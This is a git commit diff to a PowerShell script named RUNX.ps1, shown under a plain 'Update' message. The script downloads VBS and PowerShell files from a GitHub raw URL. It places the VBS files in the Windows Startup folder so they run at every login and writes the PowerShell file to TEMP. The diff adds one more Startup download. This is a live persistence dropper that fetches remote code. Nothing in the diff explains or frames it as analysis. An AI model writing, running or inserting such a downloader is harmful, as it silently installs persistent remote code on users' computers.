f24f711cf7691d0a7cb4c4a5440f67591c72129f
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-16 00:23:59 +0700

    Update RUNX.ps1

--- RUNX.ps1
+++ RUNX.ps1
@@ -1,6 +1,9 @@
 $url6 = "https://raw.githubusercontent.com/cia168168/folder/main/WINOB.vbs"
 $output6 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WINOB.vbs"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
+$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/WIN32.vbs"
+$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WIN32.vbs"
+Invoke-WebRequest -Uri $url8 -OutFile $output8
 $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
 $output5 = "$env:TEMP\RUNS.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
